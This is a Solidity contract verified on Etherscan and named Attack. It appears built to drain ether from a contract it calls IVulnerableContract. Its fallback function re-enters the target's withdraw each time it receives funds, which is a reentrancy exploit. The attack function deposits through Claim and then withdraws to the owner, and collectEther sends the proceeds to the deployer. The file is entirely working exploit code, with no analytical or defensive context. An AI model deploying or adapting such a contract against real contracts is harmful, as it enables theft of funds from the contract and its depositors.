/**
 *Submitted for verification at Etherscan.io on 2023-06-13
*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.17;

interface IVulnerableContract {
    function Claim(address sender) external payable;
    function withdraw(address to, uint256 amount) external;
}

contract Attack {
    IVulnerableContract vulnerableContract;
    address payable owner;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = IVulnerableContract(_vulnerableContractAddress);
        owner = payable(msg.sender);
    }

    fallback() external payable {
        if (address(vulnerableContract).balance >= msg.value) {
            vulnerableContract.withdraw(owner, msg.value);
        }
    }

    receive() external payable {}

    function attack() public payable {
        require(msg.value >= 1 ether, "Minimum deposit of 1 ether is required");
        vulnerableContract.Claim{value: msg.value}(address(this));
        vulnerableContract.withdraw(owner, msg.value);
    }

    function collectEther() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function deposit() public payable {
        require(msg.value >= 1 ether, "Minimum deposit of 1 ether is required");
    }
}